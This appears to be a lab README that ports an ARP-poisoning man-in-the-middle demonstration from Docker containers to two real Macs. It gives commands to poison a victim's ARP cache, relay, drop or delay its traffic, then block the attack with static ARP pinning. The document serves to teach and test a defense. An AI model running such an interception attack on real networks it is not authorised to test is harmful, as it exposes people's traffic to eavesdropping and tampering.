# macOS-to-macOS native demonstration

How the two-container-worth of functionality (victim + attacker) now runs as
plain processes on two real Macs, instead of Docker containers — what was
added to make that possible, and the exact command sequence to demonstrate it.

Topology: **Mac A = victim**, **Mac B = attacker**, your real Wi-Fi router =
gateway (no code runs on the router; it's the passive third party being
impersonated, exactly like a real-world attack). Both Macs must be on the
same Wi-Fi network, with router client/AP isolation disabled.

## Part 1 — what was added, on top of her working Docker code

The Docker lab (three Linux containers, `arplab.node`/`arplab.attack`/
`arplab.defense`) was the starting point and is untouched in its own right —
same commands, same behavior, when no `ARPLAB_*` environment variables are
set. Everything below is new, additive infrastructure that lets the *same*
`arplab` package also run directly on real hardware.

**New files:**
| File | Purpose |
|---|---|
| [arplab/io_linux.py](arplab/io_linux.py) | The original AF_PACKET raw-socket code, extracted as-is |
| [arplab/io_macos.py](arplab/io_macos.py) | New: raw Ethernet I/O via macOS's BPF (`/dev/bpf*`), since `AF_PACKET` doesn't exist on Darwin |
| [NATIVE_TESTING.md](NATIVE_TESTING.md) | Detailed phase-by-phase verification checklist (this file is the shorter demo-run version of it) |

**Modified files (all backward-compatible — identical behavior under Docker's defaults):**
| File | Change |
|---|---|
| [arplab/io.py](arplab/io.py) | Now a dispatcher: picks `io_linux` or `io_macos` based on `platform.system()`, so every other module stays platform-agnostic |
| [arplab/config.py](arplab/config.py) | Every lab address is now `os.environ.get("ARPLAB_...", <same Docker default>)` — real machines set `ARPLAB_*` env vars instead of editing code |
| [arplab/node.py](arplab/node.py) | Fixed a pre-existing bug where the interface was hardcoded to `"eth0"` instead of using the configured `IFACE` |
| [arplab/attack.py](arplab/attack.py) | Uses the platform-neutral `OUTGOING` marker and `ip_forwarding_enabled()` instead of Linux-only `socket.PACKET_OUTGOING`/`/proc` |
| [arplab/defense.py](arplab/defense.py) | Branches on platform: Linux (Docker or native) keeps her nftables/inventory design untouched; **macOS falls back to permanently pinning the peer's MAC** (`arp -s`), since `nftables` doesn't exist on Darwin |

**Bugs found and fixed along the way (via live testing, not just code review):**
1. Her Linux `disable` path used `ip neigh flush`, which silently broke the *unprotected* poisoning demo (Linux won't accept an unsolicited ARP reply into a blank neighbor table). Fixed to restore a genuine reachable entry instead, matching what the lab needs to keep working.
2. macOS's `arp -s` refuses to overwrite an existing entry, and an unscoped entry could coexist with a genuine interface-scoped one — `enable` → `enable` → `disable` used to error. Fixed by deleting the scoped entry first.
3. An early version of the macOS fallback accidentally changed detection behavior on the *Linux* side too (a shared-function scoping mistake, caught and reverted — see conversation history for the full account).

**What's actually been live-verified vs. not**, as of now:
- ✅ Docker lab: full unit + integration suite, all attack modes, nftables defense, custom `--text` modify — all passing.
- ✅ macOS: raw-socket layer (BPF send/receive/ARP resolution) against a real router; the static-pinning defense fallback (full enable/disable cycle); `node.py`'s startup path (watcher + control API).
- ❌ Not yet verified anywhere: the full attacker role's poisoning/relay loop running natively on macOS, and the true two-Mac cross-machine attack. **That's what Part 2 below is for.**

## Part 2 — running the demonstration (in order)

Do steps 1–2 on **both** Macs. Everything else says which machine it's for.

### 1. One-time: find your real addresses (both Macs)

```bash
route get default | awk '/interface:/{print $2}'   # your Wi-Fi interface name
route get default | awk '/gateway:/{print $2}'      # your router's IP
ifconfig <interface-name>                            # your own IP + MAC (inet / ether lines)
arp -n <router-ip>                                    # router's MAC (ping it first if empty)
```

### 2. Export the environment (both Macs, every new terminal)

Use the *same* values on both machines for victim/gateway/attacker — only swap which machine is "self."

```bash
export ARPLAB_IFACE=en0
export ARPLAB_VICTIM_IP=<Mac A's real IP>
export ARPLAB_VICTIM_MAC=<Mac A's real MAC>
export ARPLAB_GATEWAY_IP=<router's real IP>
export ARPLAB_GATEWAY_MAC=<router's real MAC>
export ARPLAB_ATTACKER_IP=<Mac B's real IP>
export ARPLAB_ATTACKER_MAC=<Mac B's real MAC>
export ARPLAB_ARTIFACTS_DIR=./artifacts
```

### 3. Unit tests (either Mac, no sudo)

```bash
cd /path/to/ARP-Poisoning-with-MITM-Tool
python3 -m unittest discover -s tests -v
```
Expect: `Ran 6 tests ... OK`.

### 4. Raw-socket smoke test (both Macs, sudo)

```bash
sudo -E python3 -c "
from arplab.config import GATEWAY, IFACE
from arplab.io import interface_info, raw_socket, resolve
ip, mac = interface_info(IFACE)
print('own', ip, mac)
sock = raw_socket(IFACE)
print('resolved gateway MAC:', resolve(sock, ip, mac, GATEWAY))"
```
Expect: your real IP/MAC, then `resolved gateway MAC: <router's real MAC>`. If this fails on either machine, stop — nothing else will work.

### 5. Start the victim watcher (Mac A, leave running)

```bash
sudo -E python3 -m arplab.node victim
```
Expect: `victim ready at <Mac A's IP>`.

### 6. Baseline, before any attack (Mac A, second terminal)

```bash
arp -a | grep <router-ip>
curl -s -m 3 -o /dev/null -w '%{http_code}\n' http://<router-ip>/
```
Expect: router's genuine MAC; a normal HTTP status.

### 7. Run the attack (Mac B)

```bash
sudo -E python3 -m arplab.attack --mode relay --duration 60
```
Expect (JSON lines): a `discovery` event with the real victim/gateway MACs, then `ready`.

### 8. Confirm poisoning (Mac A, during the 60s window)

```bash
arp -a | grep <router-ip>
```
Expect: entry now shows **Mac B's MAC**, not the router's — this is the core proof the attack works between two real machines.

### 9. Confirm interception (Mac B, during/after the run)

```bash
tail -f artifacts/manual/events.jsonl
```
Expect: `intercept` events for Mac A's real traffic, with `direction: victim_to_gateway` / `gateway_to_victim`.

### 10. Confirm restoration (Mac A, after the attack ends)

```bash
arp -a | grep <router-ip>
```
Expect: back to the router's genuine MAC — proves cleanup works, not just the attack.

### 11. Repeat with `--mode drop` and `--mode delay-ms 100` on Mac B (optional, same checks as steps 7–10) to demonstrate the other two attack behaviors.

### 12. Enable defense (Mac A)

```bash
sudo -E python3 -m arplab.defense victim enable
```
Expect: `{"enabled": true, "peer": "<router-ip>", "mac": "<router-mac>", "source": "macOS static pinning (nftables unavailable)"}`.

### 13. Repeat the attack (Mac B) and re-check (Mac A)

```bash
arp -a | grep <router-ip>
```
Expect: entry **stays on the router's genuine MAC** throughout, shown as `permanent` — the pin holds even while Mac B is actively trying to poison it.

### 14. Cleanup (Mac A)

```bash
sudo -E python3 -m arplab.defense victim disable
```
Expect: `{"enabled": false, ...}`, entry reverts to a normal dynamic one.

## What this sequence proves, end to end

Steps 1–6 prove the native code correctly identifies and talks to real hardware. Steps 7–10 prove genuine ARP cache poisoning and a real man-in-the-middle position between two independent physical machines — not simulated, not containerized. Step 11 proves the three attack behaviors (transparent relay, selective drop, injected delay). Steps 12–14 prove the countermeasure actually blocks the same attack that just succeeded. Together, that's full functional parity with the Docker lab's demonstrated behavior, running natively across real hardware instead of containers.
